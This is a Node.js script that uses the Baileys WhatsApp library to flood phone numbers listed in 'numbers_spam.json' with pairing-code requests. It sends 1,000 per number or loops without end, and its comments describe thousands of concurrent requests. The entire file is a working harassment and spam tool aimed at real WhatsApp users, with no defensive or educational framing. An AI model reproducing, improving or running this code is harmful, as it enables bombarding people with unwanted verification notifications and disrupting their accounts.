const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");
const fs = require('fs');
const { spawn } = require('child_process');

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => { rl.question(text, resolve) });
};

let lastModifiedTime = 0;

const checkFileChange = (filePath) => {
    const stats = fs.statSync(filePath);
    const modifiedTime = stats.mtimeMs;
    if (modifiedTime !== lastModifiedTime) {
        lastModifiedTime = modifiedTime;
        return true;
    }
    return false;
};

const MAX_CONCURRENT_REQUESTS = 5000; // عدد الطلبات المتزامنة لكل رقم

async function XeonProject() {
    const { state } = await useMultiFileAuthState('./session');
    const XeonBotInc = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });

    let phoneNumbers = [];

    const loadNumbers = () => {
        const phoneNumbersData = JSON.parse(fs.readFileSync('numbers_spam.json', 'utf8'));
        phoneNumbers = Object.values(phoneNumbersData).flat();
    };

    loadNumbers();

    const option = await Promise.race([
        question('Choose an option:\n1. 1000\n2. Unlimited\nEnter your choice (1 or 2): '),
        new Promise((resolve) => setTimeout(() => resolve('2'), 1000))
    ]);

    // إعداد المهام لكل رقم
    const tasks = phoneNumbers.map(phoneNumber => {
        return async () => {
            let count = 0;
            if (option === '1') {
                const xeonCodes = 1000;
                for (let i = 0; i < xeonCodes; i++) {
                    await sendPairingCode(XeonBotInc, phoneNumber, i + 1, xeonCodes);
                }
            } else {
                while (true) {
                    await sendPairingCode(XeonBotInc, phoneNumber, ++count);
                }
            }
        };
    });

    // تنفيذ المهام بشكل متزامن
    await Promise.all(tasks.map(task => task()));

    return XeonBotInc;
}

async function sendPairingCode(XeonBotInc, phoneNumber, index, total) {
    try {
        let code = await XeonBotInc.requestPairingCode(phoneNumber);
        code = code?.match(/.{1,4}/g)?.join("-") || code;
        console.log(`${phoneNumber} [${index}/${total || 'Unlimited'}]`);
    } catch (error) {
        console.error('Error:', error.message);
    }
}

XeonProject();
